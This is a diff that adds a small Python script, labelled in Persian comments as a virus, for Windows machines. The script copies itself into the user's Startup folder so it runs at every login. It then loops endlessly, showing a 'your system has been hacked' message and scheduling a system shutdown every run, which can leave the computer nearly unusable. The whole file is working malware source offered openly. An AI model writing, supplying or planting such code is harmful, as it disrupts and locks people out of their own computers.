@@ -1,0 +1,40 @@
+# -*- coding: utf-8 -*-
+"""
+Created on Tue Jan 30 14:55:02 2024
+
+@author: CyberMan
+"""
+
+
+from getpass import getuser
+import os
+from winsound import Beep
+#--------------------------#@#--------------------------#@#--------------------------#@#--------------------------#@#
+"""
+دستور کپی کردن فایل در پوشه استارتاپ
+"""
+username = getuser() 
+startup = 'C:\\Users\\"{}"\\AppData\\Roaming\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup'.format(username)   
+os.system("copy {} {}".format(__file__ , startup)) 
+Beep(1000,80)
+Beep(1500,80)
+Beep(2000,1000)
+
+#--------------------------#@#--------------------------#@#--------------------------#@#--------------------------#@#
+
+#--------------------------#@#--------------------------#@#
+"""
+نوشتن ویروس
+"""
+def message():
+    os.system('msg * سیستم شما هک شد')
+    
+    
+def shutdown():
+    os.system("shutdown /s /t 80")
+
+while True:
+    message ()
+    shutdown()
+
+#--------------------------#@#--------------------------#@#
